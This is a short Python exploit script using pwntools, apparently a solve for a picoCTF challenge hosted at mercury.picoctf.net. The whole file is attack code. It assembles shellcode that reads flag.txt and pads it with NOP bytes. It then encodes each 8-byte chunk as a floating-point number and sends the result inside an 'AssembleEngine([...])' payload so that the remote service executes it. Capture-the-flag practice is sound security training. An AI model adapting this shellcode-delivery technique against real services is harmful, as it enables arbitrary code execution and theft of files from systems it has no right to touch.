#!/usr/bin/env python
from pwn import *
from struct import *
context.arch = "amd64"
r = process("./server.py")
r = remote("mercury.picoctf.net", 11433)

sc = asm(shellcraft.cat("flag.txt"))
sc = sc.rjust(8*(len(sc)//8+1), b"\x90")
success("Shellcode : %s" % sc)

arr = []
for i in range(0, len(sc), 8):
    part = unpack("<d", sc[i:i+8])[0]
    arr.append(str(part))
success("Casted :", arr)
payload = "AssembleEngine([" + ",".join(arr) + "])"
r.recvuntil("5k:")
r.sendline(str(len(payload)))
r.recvuntil("please!!")
r.sendline(payload)

r.interactive()
r.close()
